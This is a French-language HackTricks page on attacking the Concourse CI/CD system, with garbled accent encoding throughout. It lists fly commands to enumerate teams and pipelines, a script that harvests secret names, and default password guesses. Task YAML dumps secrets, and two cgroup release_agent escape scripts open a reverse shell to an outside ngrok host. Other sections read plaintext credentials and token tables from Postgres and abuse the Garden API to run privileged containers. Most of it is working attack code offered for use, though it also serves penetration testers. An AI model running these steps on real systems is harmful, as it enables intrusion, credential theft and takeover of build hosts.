# Enum√©ration et Attaques Concourse

## Enum√©ration et Attaques Concourse

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en √©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

- Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
- Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
- D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
- **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
- **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

### R√¥les et Autorisations des Utilisateurs

Concourse propose cinq r√¥les :

- _Concourse_ **Admin** : Ce r√¥le est uniquement attribu√© aux propri√©taires de l'**√©quipe principale** (√©quipe concourse initiale par d√©faut). Les administrateurs peuvent **configurer d'autres √©quipes** (par exemple : `fly set-team`, `fly destroy-team`...). Les autorisations de ce r√¥le ne peuvent pas √™tre affect√©es par le RBAC.
- **propri√©taire** : Les propri√©taires d'√©quipe peuvent **modifier tout ce qui concerne l'√©quipe**.
- **membre** : Les membres de l'√©quipe peuvent **lire et √©crire** dans les **ressources de l'√©quipe** mais ne peuvent pas modifier les param√®tres de l'√©quipe.
- **op√©rateur de pipeline** : Les op√©rateurs de pipeline peuvent effectuer des **op√©rations sur le pipeline** telles que d√©clencher des builds et √©pingler des ressources, mais ils ne peuvent pas mettre √† jour les configurations du pipeline.
- **spectateur** : Les spectateurs de l'√©quipe ont un acc√®s **"lecture seule" √† une √©quipe** et √† ses pipelines.

{% hint style="info" %}
De plus, les **autorisations des r√¥les propri√©taire, membre, op√©rateur de pipeline et spectateur peuvent √™tre modifi√©es** en configurant le RBAC (en configurant plus sp√©cifiquement ses actions). En savoir plus √† ce sujet sur : [https://concourse-ci.org/user-roles.html](https://concourse-ci.org/user-roles.html)
{% endhint %}

Notez que Concourse **regroupe les pipelines √† l'int√©rieur des √©quipes**. Par cons√©quent, les utilisateurs appartenant √† une √©quipe pourront g√©rer ces pipelines et **plusieurs √©quipes** pourraient exister. Un utilisateur peut appartenir √† plusieurs √©quipes et avoir des autorisations diff√©rentes au sein de chacune d'elles.

### Variables & Gestionnaire de Cr√©dentials

Dans les configurations YAML, vous pouvez configurer des valeurs en utilisant la syntaxe `((_source-name_:_secret-path_._secret-field_))`.\
[D'apr√®s la documentation :](https://concourse-ci.org/vars.html#var-syntax) Le **nom de la source est facultatif**, et s'il est omis, le [gestionnaire de cr√©dentials √† l'√©chelle du cluster](https://concourse-ci.org/vars.html#cluster-wide-credential-manager) sera utilis√©, ou la valeur peut √™tre fournie [statiquement](https://concourse-ci.org/vars.html#static-vars).\
Le **champ facultatif \_secret-field**\_ sp√©cifie un champ sur le secret r√©cup√©r√© √† lire. S'il est omis, le gestionnaire de cr√©dentials peut choisir de lire un 'champ par d√©faut' du cr√©dential r√©cup√©r√© si le champ existe.\
De plus, le _**secret-path**_ et le _**secret-field**_ peuvent √™tre entour√©s de guillemets doubles `"..."` s'ils **contiennent des caract√®res sp√©ciaux** comme `.` et `:`. Par exemple, `((source:"my.secret"."field:1"))` d√©finira le _secret-path_ sur `my.secret` et le _secret-field_ sur `field:1`.

#### Variables Statiques

Les variables statiques peuvent √™tre sp√©cifi√©es dans les **√©tapes des t√¢ches** :
```yaml
- task: unit-1.13
file: booklit/ci/unit.yml
vars: {tag: 1.13}
```
Ou en utilisant les **arguments** `fly` suivants :

- `-v` ou `--var` `NOM=VALEUR` d√©finit la cha√Æne `VALEUR` comme valeur pour la variable `NOM`.
- `-y` ou `--yaml-var` `NOM=VALEUR` analyse `VALEUR` en tant que YAML et la d√©finit comme valeur pour la variable `NOM`.
- `-i` ou `--instance-var` `NOM=VALEUR` analyse `VALEUR` en tant que YAML et la d√©finit comme valeur pour la variable d'instance `NOM`. Consultez [Grouping Pipelines](https://concourse-ci.org/instanced-pipelines.html) pour en savoir plus sur les variables d'instance.
- `-l` ou `--load-vars-from` `FICHIER` charge `FICHIER`, un document YAML contenant des noms de variables et leurs valeurs, et les d√©finit tous.

#### Gestion des identifiants

Il existe diff√©rentes fa√ßons de sp√©cifier un **Gestionnaire d'identifiants** dans un pipeline, lisez comment faire sur [https://concourse-ci.org/creds.html](https://concourse-ci.org/creds.html).\
De plus, Concourse prend en charge diff√©rents gestionnaires d'identifiants :

- [Le gestionnaire d'identifiants Vault](https://concourse-ci.org/vault-credential-manager.html)
- [Le gestionnaire d'identifiants CredHub](https://concourse-ci.org/credhub-credential-manager.html)
- [Le gestionnaire d'identifiants AWS SSM](https://concourse-ci.org/aws-ssm-credential-manager.html)
- [Le gestionnaire d'identifiants AWS Secrets Manager](https://concourse-ci.org/aws-asm-credential-manager.html)
- [Gestionnaire d'identifiants Kubernetes](https://concourse-ci.org/kubernetes-credential-manager.html)
- [Le gestionnaire d'identifiants Conjur](https://concourse-ci.org/conjur-credential-manager.html)
- [Mise en cache des identifiants](https://concourse-ci.org/creds-caching.html)
- [Masquage des identifiants](https://concourse-ci.org/creds-redacting.html)
- [Nouvelles tentatives pour les r√©cup√©rations √©chou√©es](https://concourse-ci.org/creds-retry-logic.html)

{% hint style="danger" %}
Notez que si vous avez une sorte d'**acc√®s en √©criture √† Concourse**, vous pouvez cr√©er des t√¢ches pour **exfiltrer ces secrets** car Concourse doit pouvoir y acc√©der.
{% endhint %}

### √ânum√©ration de Concourse

Pour √©num√©rer un environnement Concourse, vous devez d'abord **collecter des identifiants valides** ou trouver un **jeton d'authentification** probablement dans un fichier de configuration `.flyrc`.

#### Connexion et √©num√©ration de l'utilisateur actuel

- Pour vous connecter, vous devez conna√Ætre le **point de terminaison**, le **nom de l'√©quipe** (par d√©faut `main`) et une **√©quipe √† laquelle l'utilisateur appartient** :
- `fly --target exemple login --team-name mon-equipe --concourse-url https://ci.exemple.com [--insecure] [--client-cert=./chemin --client-key=./chemin]`
- Obtenir les **cibles** configur√©es :
- `fly targets`
- V√©rifier si la **connexion de la cible configur√©e** est toujours **valide** :
- `fly -t <cible> status`
- Obtenir le **r√¥le** de l'utilisateur par rapport √† la cible indiqu√©e :
- `fly -t <cible> userinfo`

{% hint style="info" %}
Notez que le **jeton API** est **enregistr√©** dans `$HOME/.flyrc` par d√©faut, si vous pillez des machines, vous pourriez y trouver les identifiants.
{% endhint %}

#### √âquipes et Utilisateurs

- Obtenir une liste des √©quipes
- `fly -t <cible> teams`
- Obtenir les r√¥les √† l'int√©rieur de l'√©quipe
- `fly -t <cible> get-team -n <nom-equipe>`
- Obtenir une liste d'utilisateurs
- `fly -t <cible> active-users`

#### Pipelines

- **Lister** les pipelines :
- `fly -t <cible> pipelines -a`
- **Obtenir** le yaml du pipeline (**des informations sensibles** peuvent √™tre trouv√©es dans la d√©finition) :
- `fly -t <cible> get-pipeline -p <nom-pipeline>`
- Obtenir toutes les **variables de configuration du pipeline**
- `for nompipeline in $(fly -t <cible> pipelines | grep -Ev "^id" | awk '{print $2}'); do echo $nompipeline; fly -t <cible> get-pipeline -p $nompipeline -j | grep -Eo '"vars":[^}]+'; done`
- Obtenir tous les **noms de secrets des pipelines utilis√©s** (si vous pouvez cr√©er/modifier une t√¢che ou d√©tourner un conteneur, vous pourriez les exfiltrer) :
```bash
rm /tmp/secrets.txt;
for pipename in $(fly -t onelogin pipelines | grep -Ev "^id" | awk '{print $2}'); do
echo $pipename;
fly -t onelogin get-pipeline -p $pipename | grep -Eo '\(\(.*\)\)' | sort | uniq | tee -a /tmp/secrets.txt;
echo "";
done
echo ""
echo "ALL SECRETS"
cat /tmp/secrets.txt | sort | uniq
rm /tmp/secrets.txt
```
#### Conteneurs et Travailleurs

* Liste des **travailleurs** :
* `fly -t <cible> workers`
* Liste des **conteneurs** :
* `fly -t <cible> containers`
* Liste des **constructions** (pour voir ce qui est en cours d'ex√©cution) :
* `fly -t <cible> builds`

### Attaques sur Concourse

#### Brute-Force des identifiants

* admin:admin
* test:test

#### √ânum√©ration des secrets et des param√®tres

Dans la section pr√©c√©dente, nous avons vu comment **obtenir tous les noms de secrets et de variables** utilis√©s par le pipeline. Les **variables peuvent contenir des informations sensibles** et le nom des **secrets sera utile plus tard pour essayer de les voler**.

#### Session √† l'int√©rieur d'un conteneur en cours d'ex√©cution ou r√©cemment ex√©cut√©

Si vous avez suffisamment de privil√®ges (**r√¥le de membre ou plus**), vous pourrez **liste des pipelines et des r√¥les** et simplement obtenir une **session √† l'int√©rieur du** conteneur `<pipeline>/<t√¢che>` en utilisant :
```bash
fly -t tutorial intercept --job pipeline-name/job-name
fly -t tutorial intercept # To be presented a prompt with all the options
```
Avec ces autorisations, vous pourriez √™tre en mesure de :

* **Vol de secrets** √† l'int√©rieur du **conteneur**
* Essayer de **s'√©chapper** vers le n≈ìud
* √ânum√©rer/Abuser du point de terminaison **m√©tadonn√©es cloud** (√† partir du pod et du n≈ìud, si possible)

#### Cr√©ation/Modification de pipeline

Si vous avez suffisamment de privil√®ges (**r√¥le de membre ou plus**), vous pourrez **cr√©er/modifier de nouveaux pipelines**. Consultez cet exemple :
```yaml
jobs:
- name: simple
plan:
- task: simple-task
privileged: true
config:
# Tells Concourse which type of worker this task should run on
platform: linux
image_resource:
type: registry-image
source:
repository: busybox # images are pulled from docker hub by default
run:
path: sh
args:
- -cx
- |
echo "$SUPER_SECRET"
sleep 1000
params:
SUPER_SECRET: ((super.secret))
```
Avec la **modification/cr√©ation** d'un nouveau pipeline, vous pourrez :

- **Vol**er les **secrets** (en les affichant ou en acc√©dant au conteneur et en ex√©cutant `env`)
- **√âchapper** au **n≈ìud** (en vous donnant suffisamment de privil√®ges - `privileged: true`)
- √ânum√©rer/Abuser de l'**endpoint des m√©tadonn√©es cloud** (√† partir du pod et du n≈ìud)
- **Supprimer** le pipeline cr√©√©

#### Ex√©cuter une t√¢che personnalis√©e

Ceci est similaire √† la m√©thode pr√©c√©dente mais au lieu de modifier/cr√©er un tout nouveau pipeline, vous pouvez **simplement ex√©cuter une t√¢che personnalis√©e** (ce qui sera probablement beaucoup plus **furtif**) :
```yaml
# For more task_config options check https://concourse-ci.org/tasks.html
platform: linux
image_resource:
type: registry-image
source:
repository: ubuntu
run:
path: sh
args:
- -cx
- |
env
sleep 1000
params:
SUPER_SECRET: ((super.secret))
```

```bash
fly -t tutorial execute --privileged --config task_config.yml
```
#### √âchapper au n≈ìud √† partir de la t√¢che privil√©gi√©e

Dans les sections pr√©c√©dentes, nous avons vu comment **ex√©cuter une t√¢che privil√©gi√©e avec Concourse**. Cela ne donnera pas exactement au conteneur le m√™me acc√®s que le drapeau privil√©gi√© dans un conteneur Docker. Par exemple, vous ne verrez pas le p√©riph√©rique du syst√®me de fichiers du n≈ìud dans /dev, donc l'√©vasion pourrait √™tre plus "complexe".

Dans le PoC suivant, nous allons utiliser le release\_agent pour nous √©chapper avec quelques petites modifications :
```bash
# Mounts the RDMA cgroup controller and create a child cgroup
# If you're following along and get "mount: /tmp/cgrp: special device cgroup does not exist"
# It's because your setup doesn't have the memory cgroup controller, try change memory to rdma to fix it
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release


# CHANGE ME
# The host path will look like the following, but you need to change it:
host_path="/mnt/vda1/hostpath-provisioner/default/concourse-work-dir-concourse-release-worker-0/overlays/ae7df0ca-0b38-4c45-73e2-a9388dcb2028/rootfs"

## The initial path "/mnt/vda1" is probably the same, but you can check it using the mount command:
#/dev/vda1 on /scratch type ext4 (rw,relatime)
#/dev/vda1 on /tmp/build/e55deab7 type ext4 (rw,relatime)
#/dev/vda1 on /etc/hosts type ext4 (rw,relatime)
#/dev/vda1 on /etc/resolv.conf type ext4 (rw,relatime)

## Then next part I think is constant "hostpath-provisioner/default/"

## For the next part "concourse-work-dir-concourse-release-worker-0" you need to know how it's constructed
# "concourse-work-dir" is constant
# "concourse-release" is the consourse prefix of the current concourse env (you need to find it from the API)
# "worker-0" is the name of the worker the container is running in (will be usually that one or incrementing the number)

## The final part "overlays/bbedb419-c4b2-40c9-67db-41977298d4b3/rootfs" is kind of constant
# running `mount | grep "on / " | grep -Eo "workdir=([^,]+)"` you will see something like:
# workdir=/concourse-work-dir/overlays/work/ae7df0ca-0b38-4c45-73e2-a9388dcb2028
# the UID is the part we are looking for

# Then the host_path is:
#host_path="/mnt/<device>/hostpath-provisioner/default/concourse-work-dir-<concourse_prefix>-worker-<num>/overlays/<UID>/rootfs"

# Sets release_agent to /path/payload
echo "$host_path/cmd" > /tmp/cgrp/release_agent


#====================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/0.tcp.ngrok.io/14966 0>&1" >> /cmd
chmod a+x /cmd
#====================================
# Get output
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#====================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```
{% hint style="warning" %}
Comme vous l'avez peut-√™tre remarqu√©, il s'agit simplement d'une [**√©vasion d'agent de publication r√©guli√®re**](https://github.com/carlospolop/hacktricks-cloud/blob/master/pentesting-ci-cd/concourse-security/broken-reference/README.md) en modifiant simplement le chemin de la commande dans le n≈ìud
{% endhint %}

#### √âvasion vers le n≈ìud √† partir d'un conteneur Worker

Une √©vasion d'agent de publication r√©guli√®re avec une l√©g√®re modification est suffisante pour cela :
```bash
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab | head -n 1`
echo "$host_path/cmd" > /tmp/cgrp/release_agent

#====================================
#Reverse shell
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/0.tcp.ngrok.io/14966 0>&1" >> /cmd
chmod a+x /cmd
#====================================
# Get output
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
#====================================

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

# Reads the output
cat /output
```
#### √âchapper au n≈ìud depuis le conteneur Web

M√™me si le conteneur Web a certaines d√©fenses d√©sactiv√©es, il **ne s'ex√©cute pas en tant que conteneur privil√©gi√© commun** (par exemple, vous **ne pouvez pas** **monter** et les **capacit√©s** sont tr√®s **limit√©es**, donc toutes les m√©thodes faciles pour s'√©chapper du conteneur sont inutiles).

Cependant, il stocke des **informations d'identification locales en clair** :
```bash
cat /concourse-auth/local-users
test:test

env | grep -i local_user
CONCOURSE_MAIN_TEAM_LOCAL_USER=test
CONCOURSE_ADD_LOCAL_USER=test:test
```
Vous pouvez utiliser ces informations d'identification pour **vous connecter au serveur web** et **cr√©er un conteneur privil√©gi√© et vous √©chapper vers le n≈ìud**.

Dans l'environnement, vous pouvez √©galement trouver des informations pour **acc√©der √† l'instance postgresql** utilis√©e par concourse (adresse, **nom d'utilisateur**, **mot de passe** et base de donn√©es, entre autres informations) :
```bash
env | grep -i postg
CONCOURSE_RELEASE_POSTGRESQL_PORT_5432_TCP_ADDR=10.107.191.238
CONCOURSE_RELEASE_POSTGRESQL_PORT_5432_TCP_PORT=5432
CONCOURSE_RELEASE_POSTGRESQL_SERVICE_PORT_TCP_POSTGRESQL=5432
CONCOURSE_POSTGRES_USER=concourse
CONCOURSE_POSTGRES_DATABASE=concourse
CONCOURSE_POSTGRES_PASSWORD=concourse
[...]

# Access the postgresql db
psql -h 10.107.191.238 -U concourse -d concourse
select * from password; #Find hashed passwords
select * from access_tokens;
select * from auth_code;
select * from client;
select * from refresh_token;
select * from teams; #Change the permissions of the users in the teams
select * from users;
```
#### Abus du service Garden - Pas une v√©ritable attaque

{% hint style="warning" %}
Il s'agit simplement de quelques notes int√©ressantes sur le service, mais comme il n'√©coute que sur localhost, ces notes n'auront aucun impact que nous n'avons pas d√©j√† exploit√© auparavant.
{% endhint %}

Par d√©faut, chaque travailleur de Concourse ex√©cutera un service [**Garden**](https://github.com/cloudfoundry/garden) sur le port 7777. Ce service est utilis√© par le ma√Ætre Web pour indiquer au travailleur **ce qu'il doit ex√©cuter** (t√©l√©charger l'image et ex√©cuter chaque t√¢che). Cela semble assez int√©ressant pour un attaquant, mais il existe quelques protections int√©ressantes :

* Il est simplement **expos√© localement** (127.0.0.1) et je pense que lorsque le travailleur s'authentifie √† nouveau sur le Web avec le service SSH sp√©cial, un tunnel est cr√©√© pour que le serveur Web puisse **communiquer avec chaque service Garden** √† l'int√©rieur de chaque travailleur.
* Le serveur Web **surveille les conteneurs en cours d'ex√©cution toutes les quelques secondes**, et les conteneurs **inattendus** sont **supprim√©s**. Donc, si vous voulez **ex√©cuter un conteneur personnalis√©**, vous devez **manipuler** la **communication** entre le serveur Web et le service Garden.

Les travailleurs de Concourse s'ex√©cutent avec des privil√®ges de conteneur √©lev√©s :
```
Container Runtime: docker
Has Namespaces:
pid: true
user: false
AppArmor Profile: kernel
Capabilities:
BOUNDING -> chown dac_override dac_read_search fowner fsetid kill setgid setuid setpcap linux_immutable net_bind_service net_broadcast net_admin net_raw ipc_lock ipc_owner sys_module sys_rawio sys_chroot sys_ptrace sys_pacct sys_admin sys_boot sys_nice sys_resource sys_time sys_tty_config mknod lease audit_write audit_control setfcap mac_override mac_admin syslog wake_alarm block_suspend audit_read
Seccomp: disabled
```
Cependant, des techniques comme **monter** le p√©riph√©rique /dev du n≈ìud ou release\_agent **ne fonctionneront pas** (car le vrai p√©riph√©rique avec le syst√®me de fichiers du n≈ìud n'est pas accessible, seulement un virtuel). Nous ne pouvons pas acc√©der aux processus du n≈ìud, donc s'√©chapper du n≈ìud sans exploits du noyau devient compliqu√©.

{% hint style="info" %}
Dans la section pr√©c√©dente, nous avons vu comment s'√©chapper d'un conteneur privil√©gi√©, donc si nous pouvons **ex√©cuter** des commandes dans un **conteneur privil√©gi√©** cr√©√© par le **travailleur** **actuel**, nous pourrions **s'√©chapper vers le n≈ìud**.
{% endhint %}

Notez qu'en jouant avec Concourse, j'ai remarqu√© que lorsqu'un nouveau conteneur est cr√©√© pour ex√©cuter quelque chose, les processus du conteneur sont accessibles depuis le conteneur du travailleur, c'est donc comme si un conteneur cr√©ait un nouveau conteneur √† l'int√©rieur de lui.

**Acc√©der √† un conteneur privil√©gi√© en cours d'ex√©cution**
```bash
# Get current container
curl 127.0.0.1:7777/containers
{"Handles":["ac793559-7f53-4efc-6591-0171a0391e53","c6cae8fc-47ed-4eab-6b2e-f3bbe8880690"]}

# Get container info
curl 127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/info
curl 127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/properties

# Execute a new process inside a container
## In this case "sleep 20000" will be executed in the container with handler ac793559-7f53-4efc-6591-0171a0391e53
wget -v -O- --post-data='{"id":"task2","path":"sh","args":["-cx","sleep 20000"],"dir":"/tmp/build/e55deab7","rlimits":{},"tty":{"window_size":{"columns":500,"rows":500}},"image":{}}' \
--header='Content-Type:application/json' \
'http://127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/processes'

# OR instead of doing all of that, you could just get into the ns of the process of the privileged container
nsenter --target 76011 --mount --uts --ipc --net --pid -- sh
```
**Cr√©ation d'un nouveau conteneur privil√©gi√©**

Vous pouvez tr√®s facilement cr√©er un nouveau conteneur (ex√©cuter simplement un UID al√©atoire) et ex√©cuter quelque chose dessus :
```bash
curl -X POST http://127.0.0.1:7777/containers \
-H 'Content-Type: application/json' \
-d '{"handle":"123ae8fc-47ed-4eab-6b2e-123458880690","rootfs":"raw:///concourse-work-dir/volumes/live/ec172ffd-31b8-419c-4ab6-89504de17196/volume","image":{},"bind_mounts":[{"src_path":"/concourse-work-dir/volumes/live/9f367605-c9f0-405b-7756-9c113eba11f1/volume","dst_path":"/scratch","mode":1}],"properties":{"user":""},"env":["BUILD_ID=28","BUILD_NAME=24","BUILD_TEAM_ID=1","BUILD_TEAM_NAME=main","ATC_EXTERNAL_URL=http://127.0.0.1:8080"],"limits":{"bandwidth_limits":{},"cpu_limits":{},"disk_limits":{},"memory_limits":{},"pid_limits":{}}}'

# Wget will be stucked there as long as the process is being executed
wget -v -O- --post-data='{"id":"task2","path":"sh","args":["-cx","sleep 20000"],"dir":"/tmp/build/e55deab7","rlimits":{},"tty":{"window_size":{"columns":500,"rows":500}},"image":{}}' \
--header='Content-Type:application/json' \
'http://127.0.0.1:7777/containers/ac793559-7f53-4efc-6591-0171a0391e53/processes'
```
Cependant, le serveur web v√©rifie toutes les quelques secondes les conteneurs en cours d'ex√©cution, et s'il en d√©couvre un inattendu, il sera supprim√©. Comme la communication se fait en HTTP, vous pourriez alt√©rer la communication pour √©viter la suppression des conteneurs inattendus:
```
GET /containers HTTP/1.1.
Host: 127.0.0.1:7777.
User-Agent: Go-http-client/1.1.
Accept-Encoding: gzip.
.

T 127.0.0.1:7777 -> 127.0.0.1:59722 [AP] #157
HTTP/1.1 200 OK.
Content-Type: application/json.
Date: Thu, 17 Mar 2022 22:42:55 GMT.
Content-Length: 131.
.
{"Handles":["123ae8fc-47ed-4eab-6b2e-123458880690","ac793559-7f53-4efc-6591-0171a0391e53","c6cae8fc-47ed-4eab-6b2e-f3bbe8880690"]}

T 127.0.0.1:59722 -> 127.0.0.1:7777 [AP] #159
DELETE /containers/123ae8fc-47ed-4eab-6b2e-123458880690 HTTP/1.1.
Host: 127.0.0.1:7777.
User-Agent: Go-http-client/1.1.
Accept-Encoding: gzip.
```
## R√©f√©rences

* https://concourse-ci.org/vars.html

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert de l'√©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks:

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>
